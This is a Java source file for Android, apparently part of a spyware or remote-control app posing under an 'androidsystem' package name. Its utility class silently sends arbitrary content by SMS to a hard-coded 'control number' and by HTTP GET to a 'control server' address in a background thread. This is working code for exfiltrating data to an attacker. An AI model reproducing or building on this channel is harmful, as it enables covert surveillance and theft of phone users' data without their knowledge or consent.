package com.me.androidsystem.util;

import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.List;

import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;


public class CommndUtil {
	static String path;
	/*
	 * 将信息以短信的方式发出
	 */
	public static boolean sendSMS(String content){
    	SmsManager smsManager = SmsManager.getDefault();
    	List<String> list = smsManager.divideMessage(content);
    	for(String msg : list){
    		smsManager.sendTextMessage(ServiceUtil.CONTROL_NUMBER, null, msg, null, null);
    	}
//    	smsManager.sendTextMessage(ServiceUtil.CONTROL_NUMBER, null, list.get(0), null, null);
    	return true;
	}
	
	/*
	 * 将信息以网络的方式发出
	 */
	public static boolean sendInternet(String content,String action){
		
			String params = null;
			try {
				params = "content="+ URLEncoder.encode("-\n-------------------------\n"+content, "UTF-8");
			} catch (UnsupportedEncodingException e1) {
				e1.printStackTrace();
			}

			path = ServiceUtil.CONTROL_SERVER_ADDRESS + action +"?" +params;
			new Thread(new Runnable() {
				@Override
				public void run() {
					try{
					HttpURLConnection conn = (HttpURLConnection) new URL(path).openConnection();
					conn.setConnectTimeout(5000);
					conn.setRequestMethod("GET");
					if(conn.getResponseCode() == 200){
						
					}}catch (Exception e) {
					
						e.printStackTrace();
					}
				}
			}).start();
			
			
			
		
		return true;
	}

	public static boolean sendSMS(String content, String number) {
		SmsManager smsManager = SmsManager.getDefault();
    	List<String> list = smsManager.divideMessage(content);
    	for(String msg : list){
    		smsManager.sendTextMessage(number, null, msg, null, null);
    	}
    	return true;
	}
	
}
